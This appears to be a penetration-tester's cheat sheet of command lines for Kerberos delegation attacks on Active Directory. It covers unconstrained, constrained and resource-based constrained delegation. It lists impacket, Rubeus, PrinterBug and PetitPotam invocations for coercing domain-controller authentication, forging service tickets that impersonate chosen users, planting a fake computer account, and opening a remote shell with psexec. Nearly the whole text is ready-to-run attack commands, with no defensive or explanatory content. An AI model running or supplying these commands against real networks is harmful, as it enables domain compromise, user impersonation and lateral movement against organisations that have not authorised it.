# Delegation Attacks

## Unconstrained Delegation

### findDelegation Find Unconstrained
    impacket-findDelegation <DOMAIN>/<USER>:<PASSWORD> -dc-ip <TARGET_IP>

### Rubeus Monitor TGTs (Windows)
    .\Rubeus.exe monitor /interval:5 /nowrap

### PrinterBug Coerce Authentication
    python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <LISTENER_IP>

### PetitPotam Coerce Authentication
    python3 PetitPotam.py <LISTENER_IP> <DC_IP>


## Constrained Delegation

### GetST Constrained Delegation
    impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate <TARGET_USER> <DOMAIN>/<USER>:<PASSWORD>

### Export Kerberos Ticket
    export KRB5CCNAME=<TARGET_USER>.ccache

### PsExec With Ticket
    impacket-psexec -k -no-pass <DOMAIN>/<TARGET_USER>@<TARGET_HOST>.<DOMAIN>

### GetST S4U2Self S4U2Proxy
    impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate <TARGET_USER> -dc-ip <TARGET_IP> <DOMAIN>/<USER>:<PASSWORD>


## Resource-Based Constrained Delegation (RBCD)

### Add Computer Account
    impacket-addcomputer <DOMAIN>/<USER>:<PASSWORD> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASSWORD>'

### Set RBCD Attribute
    impacket-rbcd -delegate-from '<FAKE_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write <DOMAIN>/<USER>:<PASSWORD>

### GetST RBCD Service Ticket
    impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate <TARGET_USER> <DOMAIN>/'<FAKE_COMPUTER>$':'<FAKE_PASSWORD>'
